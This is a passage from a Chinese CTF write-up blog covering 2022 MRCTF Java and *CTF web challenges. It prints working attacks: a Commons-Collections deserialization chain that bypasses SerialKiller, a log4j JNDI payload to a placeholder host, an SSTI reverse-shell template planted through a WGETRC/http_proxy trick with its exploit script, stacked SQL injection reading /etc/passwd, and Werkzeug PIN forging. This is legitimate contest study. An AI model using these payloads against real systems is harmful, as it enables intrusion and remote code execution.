src="/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/4.png"></p><p>其中<code>org.apache.commons.collections.functors.ConstantFactory#create</code>可以返回任意值</p><p>代替<code>ConstantTransformer</code></p><p><code>org.apache.commons.collections.functors.InstantiateFactory#create</code>可以实例化任意类</p><p>代替<code>InstantiateTransformer</code>去实例化对象</p><p>那看到这里你有什么思路了吗？熟悉CC链的童鞋一定会知道TrAXFilter的构造函数当中可以帮助我们触发TemplatesImpl字节码加载的过程</p><p>通过如下构造，我们能很轻松的触发计算器</p><p>Ps小细节：对expMap做put操作会触发hashCode会导致利用链在序列化过程当中触发导致报错，别忘了先设置一个无关紧要的transformer(比如ConstantTransformer)最后再反射替换成我们恶意的Transformer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.FactoryTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateFactory;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.nibblesec.tools.SerialKiller;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;</span><br><span class="line">                ClassPool.getDefault().get(EvilTemplatesImpl.class.getName()).toBytecode()</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        InstantiateFactory instantiateFactory;</span><br><span class="line">        instantiateFactory = <span class="keyword">new</span> InstantiateFactory(com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter.class</span><br><span class="line">        ,<span class="keyword">new</span> Class[]&#123;javax.xml.transform.Templates.class&#125;,<span class="keyword">new</span> Object[]&#123;obj&#125;);</span><br><span class="line"></span><br><span class="line">        FactoryTransformer factoryTransformer = <span class="keyword">new</span> FactoryTransformer(instantiateFactory);</span><br><span class="line"></span><br><span class="line">        ConstantTransformer constantTransformer = <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        LazyMap outerMap = (LazyMap)LazyMap.decorate(innerMap, constantTransformer);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tme = <span class="keyword">new</span> TiedMapEntry(outerMap, <span class="string">&quot;keykey&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map expMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        expMap.put(tme, <span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line">        setFieldValue(outerMap,<span class="string">&quot;factory&quot;</span>,factoryTransformer);</span><br><span class="line"></span><br><span class="line">        outerMap.remove(<span class="string">&quot;keykey&quot;</span>);</span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line"></span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(expMap);</span><br><span class="line"></span><br><span class="line">        ByteArrayInputStream byteArrayInputStream = <span class="keyword">new</span> ByteArrayInputStream(byteArrayOutputStream.toByteArray());</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> SerialKiller(byteArrayInputStream, <span class="string">&quot;/Users/y4tacker/Downloads/ezjavaz/serialkiller.xml&quot;</span>);</span><br><span class="line">        ois.readObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/5.png"></p><p>后面就是获取注入一个内存马即可获取flag，这部分不谈基础东西而已</p><p><img src="/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/6.jpg"></p><p>那么就结束了这一题</p><h2 id="Java-mem-shell-Filter"><a href="#Java-mem-shell-Filter" class="headerlink" title="Java_mem_shell_Filter"></a>Java_mem_shell_Filter</h2><p>首先只给了一个登录功能</p><p><img src="/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/2.png"></p><p>通过随便访问不存在页面，导致报错抛出也可以得到是tomcat8.0.12版本，那版本问题可以忽略了</p><p>接下来由于后端响应真的很快，在公共环境下能做到这样首先考虑弱口令，爆破无效</p><p>突然想到能不能打log4j2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=$&#123;jndi:rmi://xxxxx/exp&#125;&amp;password=admin</span><br></pre></td></tr></table></figure><p>后面拿flag也是比较阴间，这里不重要不写了，涉及到dump内存的操作还是写写吧</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmap -dump:format=b,file=e.bin &lt;pid&gt;</span><br></pre></td></tr></table></figure><h2 id="Java-mem-shell-Basic"><a href="#Java-mem-shell-Basic" class="headerlink" title="Java_mem_shell_Basic"></a>Java_mem_shell_Basic</h2><p>可以看见直接是一个tomcat，看了版本没啥可利用的1day，同时版本比较低不存在幽灵猫漏洞</p><p><img src="/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/1.png"></p><p>那么接下来就只能考虑后台弱口令了，<code>tomcat/tomcat</code>，之后部署一个war包上去，直接冰蝎一把梭哈，就是flag位置比较阴间<code>/usr/local/apache-tomcat-8.0.12/work/Catalina/localhost/ROOT/org/apache/jsp/threatbook_jsp.java</code></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Kryo </tag>
            
            <tag> Serialkiller </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022*CTF-Web</title>
      <link href="/2022/04/18/year/2022/4/2022-CTF-Web/"/>
      <url>/2022/04/18/year/2022/4/2022-CTF-Web/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="2022-CTF-Web"><a href="#2022-CTF-Web" class="headerlink" title="2022*CTF-Web"></a>2022*CTF-Web</h1><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>XCTF国际赛系列一直不错，周末参与了下这次比赛，虽然没有Java但总体还是蛮有意思</p><p>这里没按题目顺序写，只是写了在我心中从上到下的排序，对有源码的题目做了备份</p><p>oh-my-lotto</p><p>​    链接: <a href="https://pan.baidu.com/s/1G53aYqIIbHGlowdWFhkKqw">https://pan.baidu.com/s/1G53aYqIIbHGlowdWFhkKqw</a> 提取码: oism</p><h2 id="oh-my-lotto"><a href="#oh-my-lotto" class="headerlink" title="oh-my-lotto"></a>oh-my-lotto</h2><p>心目中比较有趣的一题呗，重生之我是赌神</p><p>这是一个非预期，因为后面又上了个revenge，简单分析下题目，先看看docker内容，可以知道大概的结构</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">version: &quot;3&quot; </span><br><span class="line">services:</span><br><span class="line"></span><br><span class="line">  lotto:</span><br><span class="line">    build:</span><br><span class="line">      context: lotto/</span><br><span class="line">      dockerfile: Dockerfile</span><br><span class="line">    container_name: &quot;lotto&quot;</span><br><span class="line"></span><br><span class="line">  app:  </span><br><span class="line">    build:</span><br><span class="line">      context: app/</span><br><span class="line">      dockerfile: Dockerfile</span><br><span class="line">    links:</span><br><span class="line">      - lotto</span><br><span class="line">    container_name: &quot;app&quot;</span><br><span class="line">      </span><br><span class="line">    ports:</span><br><span class="line">      - &quot;8880:8080&quot;</span><br></pre></td></tr></table></figure><p>之后看看代码，这里面有三个路由，从短到长</p><p>首先result路由返回<code>/app/lotto_result.txt</code>文件内容结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/result&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">result</span>():</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(<span class="string">&quot;/app/lotto_result.txt&quot;</span>):</span><br><span class="line">        lotto_result = <span class="built_in">open</span>(<span class="string">&quot;/app/lotto_result.txt&quot;</span>, <span class="string">&#x27;rb&#x27;</span>).read().decode()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        lotto_result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;result.html&#x27;</span>, message=lotto_result)</span><br></pre></td></tr></table></figure><p><code>forecast</code>路由可以上传一个文件保存到<code>/app/guess/forecast.txt</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/forecast&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">forecast</span>():</span></span><br><span class="line"></span><br><span class="line">    message = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;forecast.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">            message = <span class="string">&#x27;Where is your forecast?&#x27;</span></span><br><span class="line">            </span><br><span class="line">        file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        file.save(<span class="string">&#x27;/app/guess/forecast.txt&#x27;</span>)</span><br><span class="line">        message = <span class="string">&quot;OK, I get your forecast. Let&#x27;s Lotto!&quot;</span></span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;forecast.html&#x27;</span>, message=message)</span><br></pre></td></tr></table></figure><p>还有最关键的lotto路由(代码太多就不放完了)，可以</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.system(<span class="string">&#x27;wget --content-disposition -N lotto&#x27;</span>)</span><br></pre></td></tr></table></figure><p>如果预测的值与环境随机生成的相等就能获得flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/lotto&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lotto</span>():</span></span><br><span class="line">   </span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">      //看到flag从环境变量当中取出</span><br><span class="line">        flag = os.getenv(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">        lotto_key = request.form.get(<span class="string">&#x27;lotto_key&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">        lotto_value = request.form.get(<span class="string">&#x27;lotto_value&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">        lotto_key = lotto_key.upper()</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> safe_check(lotto_key):</span><br><span class="line">            os.environ[lotto_key] = lotto_value</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">              //从内网http://lotto当中获得随机值</span><br><span class="line">                os.system(<span class="string">&#x27;wget --content-disposition -N lotto&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> os.path.exists(<span class="string">&quot;/app/lotto_result.txt&quot;</span>):</span><br><span class="line">                    lotto_result = <span class="built_in">open</span>(<span class="string">&quot;/app/lotto_result.txt&quot;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    lotto_result = <span class="string">&#x27;result&#x27;</span></span><br><span class="line">                <span class="keyword">if</span> os.path.exists(<span class="string">&quot;/app/guess/forecast.txt&quot;</span>):</span><br><span class="line">                    forecast = <span class="built_in">open</span>(<span class="string">&quot;/app/guess/forecast.txt&quot;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    forecast = <span class="string">&#x27;forecast&#x27;</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> forecast == lotto_result:</span><br><span class="line">                    <span class="keyword">return</span> flag</span><br></pre></td></tr></table></figure><p>其中内网的lotto页面可以看到就是随机生成20个40以内随机数并返回</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    lotto = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">        n = <span class="built_in">str</span>(secrets.randbelow(<span class="number">40</span>))</span><br><span class="line">        lotto.append(n)</span><br><span class="line">    </span><br><span class="line">    r = <span class="string">&#x27;\n&#x27;</span>.join(lotto)</span><br><span class="line">    response = make_response(r)</span><br><span class="line">    response.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;text/plain&#x27;</span></span><br><span class="line">    response.headers[<span class="string">&#x27;Content-Disposition&#x27;</span>] = <span class="string">&#x27;attachment; filename=lotto_result.txt&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>同时对于我们能控制的环境变量也有过滤<code>safe_check</code>，那像p牛之前提到的直接RCE就不行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">safe_check</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;LD&#x27;</span> <span class="keyword">in</span> s <span class="keyword">or</span> <span class="string">&#x27;HTTP&#x27;</span> <span class="keyword">in</span> s <span class="keyword">or</span> <span class="string">&#x27;BASH&#x27;</span> <span class="keyword">in</span> s <span class="keyword">or</span> <span class="string">&#x27;ENV&#x27;</span> <span class="keyword">in</span> s <span class="keyword">or</span> <span class="string">&#x27;PROXY&#x27;</span> <span class="keyword">in</span> s <span class="keyword">or</span> <span class="string">&#x27;PS&#x27;</span> <span class="keyword">in</span> s: </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure><p>既然题目要求如果预测成功就返回给我flag，那有啥办法能控制吗，这里就用到了<code>PATH</code></p><p><code>PATH变量</code>就是用于保存可以搜索的目录路径，如果待运行的程序不在当前目录，操作系统便可以去依次搜索<code>PATH变量</code>变量中记录的目录，如果在这些目录中找到待运行的程序，操作系统便可以直接运行，前提是有执行权限</p><p>那这样就比较简单了，如果我们控制环境变量<code>PATH</code>，让他找不到<code>wget</code>，这样<code>wget --content-disposition -N lotto</code>就会报错导致程序终止，<code>/app/lotto_result.txt</code>当中的内容就一直是第一次访问，随机生成的那个值了</p><ol><li><p>访问/lotto获得第一次的结果</p></li><li><p>访问result页面记录内容下来备用</p></li></ol><p><img src="/2022/04/18/year/2022/4/2022-CTF-Web/12.png"></p><ol start="3"><li>修改环境变量PATH后，发送预测值，再次访问/lotto即可</li></ol><p>可以看到确实得到了flag，其中res.txt是第一次环境随机生成的结果</p><p><img src="/2022/04/18/year/2022/4/2022-CTF-Web/11.png"></p><h2 id="oh-my-lotto-revenge"><a href="#oh-my-lotto-revenge" class="headerlink" title="oh-my-lotto-revenge"></a>oh-my-lotto-revenge</h2><p>做了一个修正，就算预测成功也没有结果返回，那就考虑如何rce了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> forecast == lotto_result:</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;You are right!But where is flag?&quot;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">  message = <span class="string">&#x27;Sorry forecast failed, maybe lucky next time!&#x27;</span></span><br><span class="line">  <span class="keyword">return</span> render_template(<span class="string">&#x27;lotto.html&#x27;</span>, message=message)</span><br></pre></td></tr></table></figure><p>先读文档<a href="https://www.gnu.org/software/wget/manual/wget.html#:~:text=6.1-,Wgetrc%20Location,-When%20initializing%2C%20Wget">https://www.gnu.org/software/wget/manual/wget.html#:~:text=6.1-,Wgetrc%20Location,-When%20initializing%2C%20Wget</a></p><p><img src="/2022/04/18/year/2022/4/2022-CTF-Web/13.png"></p><p>发现有一个<code>WGETRC</code>，如果我们能够控制环境变量就可以操纵wget的参数了，这里有很多有意思的变量</p><p><img src="/2022/04/18/year/2022/4/2022-CTF-Web/14.png"></p><p>这里说两个我解决这个问题用到的，一个是http_proxy，很明显如果配置了这个，本来是直接wget访问<code>http://lotto</code>的就会先到我们这里做一个转发，我们就可以当一个中间人</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http_proxy = string</span><br><span class="line">Use string as HTTP proxy, instead of the one specified in environment.</span><br></pre></td></tr></table></figure><p>做个实验，此时再wget以后，成功接收到这个请求</p><p><img src="/2022/04/18/year/2022/4/2022-CTF-Web/15.png"></p><p>因此我们只需要控制返回内容即可，那既然可以控制内容了，那能否控制目录呢，正好有output_document，相当于<code>-O</code>参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">output_document = file</span><br><span class="line">Set the output filename—the same as ‘-O file’.</span><br></pre></td></tr></table></figure><p>那么我覆盖index.html打SSTI即可</p><p><img src="/2022/04/18/year/2022/4/2022-CTF-Web/16.png"></p><p>因此得到payload，写入内容为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http_proxy=http://xxxxx</span><br><span class="line">output_document = templates/index.html</span><br></pre></td></tr></table></figure><p>控制返回内容为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;反弹shell&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">web</span>():</span></span><br><span class="line">    url = <span class="string">&quot;http://xxx/&quot;</span></span><br><span class="line"></span><br><span class="line">    r = requests.post(url + <span class="string">&quot;forecast&quot;</span>,</span><br><span class="line">                      files=&#123;<span class="string">&#x27;file&#x27;</span>: <span class="built_in">open</span>(<span class="string">&quot;/Users/y4tacker/PycharmProjects/pythonProject/lottt/y4.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>)&#125;)</span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;lotto_key&quot;</span>: <span class="string">&quot;WGETRC&quot;</span>,</span><br><span class="line">        <span class="string">&quot;lotto_value&quot;</span>: <span class="string">&quot;/app/guess/forecast.txt&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    r = requests.post(url + <span class="string">&quot;lotto&quot;</span>, data=data)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    web()</span><br></pre></td></tr></table></figure><p><img src="/2022/04/18/year/2022/4/2022-CTF-Web/17.png"></p><h2 id="oh-my-notepro"><a href="#oh-my-notepro" class="headerlink" title="oh-my-notepro"></a>oh-my-notepro</h2><p>好吧又是黑盒，烦死了</p><p>登录后，只有一个创建note的功能点，先是测试了下各种SSTI的payload没啥反应，之后猜测是不是要获取到admin的noteid，首先看到这种又臭又长<code>0pn2jtgnfer9zaijadymsmq347eqmay3</code>的字符肯定是不能爆破，尝试sql注入，经典单引号报错</p><p><img src="/2022/04/18/year/2022/4/2022-CTF-Web/4.png"></p><p>尝试回显有五列，但是payload这么简单，毕竟是XCTF肯定不可能sql注入就能从数据库拖出flag(大概率无过滤是不可能这么简单的)，当然也确实验证了没有flag，甚至没有admin用户</p><p><img src="/2022/04/18/year/2022/4/2022-CTF-Web/5.png"></p><p>接下来尝试load_file读文件也不行，后面想去看看一些配置信息，一般我们通过类似<code>show variables like xxx</code>这样去读，但是其实也可以直接通过sql语句拿到global当中的信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select @@global.secure_file_priv</span><br></pre></td></tr></table></figure><p>好吧真拿你没办法洛</p><p><img src="/2022/04/18/year/2022/4/2022-CTF-Web/6.png"></p><p>后面发现local_infile开了，不知道这是啥可以看看<a href="https://paper.seebug.org/1112/">CSS-T | Mysql Client 任意文件读取攻击链拓展</a></p><p><img src="/2022/04/18/year/2022/4/2022-CTF-Web/7.png"></p><p>那么要利用肯定常规的注入不行，只有一个东西能满足，那就是堆叠注入，简单验证下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.60.72.85:5002/view?note_id=0&#x27; union select 1,2,3,4,5;select sleep(2)--+</span><br></pre></td></tr></table></figure><p>页面确实有延时那验证了我们的猜想，接下来读文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.60.72.85:5002/view?note_id=0&#x27; union select 1,2,3,4,5; create table y4(t text); load data local infile &#x27;/etc/passwd&#x27; INTO TABLE y4 LINES TERMINATED BY &#x27;\n&#x27;--+</span><br></pre></td></tr></table></figure><p>果然可以bro</p><p><img src="/2022/04/18/year/2022/4/2022-CTF-Web/8.png"></p><p>那么想要rce只剩一个方法咯，都有报错页面了，算算pin呗</p><p>需要：</p><p>1.flask所登录的用户名</p><p>2.modname-一般固定为flask.app</p><p>3.getattr(app, “name”, app.class.name) - 固定，一般为Flask</p><p>4.在flask库下app.py的绝对路径，通过报错泄漏</p><p>5.当前网络的mac地址的十进制数</p><p>6.docker机器id</p><p><img src="/2022/04/18/year/2022/4/2022-CTF-Web/9.png"></p><p>网上直接抄了一个发现不对，简单看了flask生成pin码的地方，在<code>python3.8/site-packages/werkzeug/debug/__init__.py#get_pin_and_cookie_name</code></p><p>发现python3.8以后从原来的md5改成了sha1</p><p><img src="/2022/04/18/year/2022/4/2022-CTF-Web/10.png"></p><p>那简单写个利用脚本就好了呗</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span 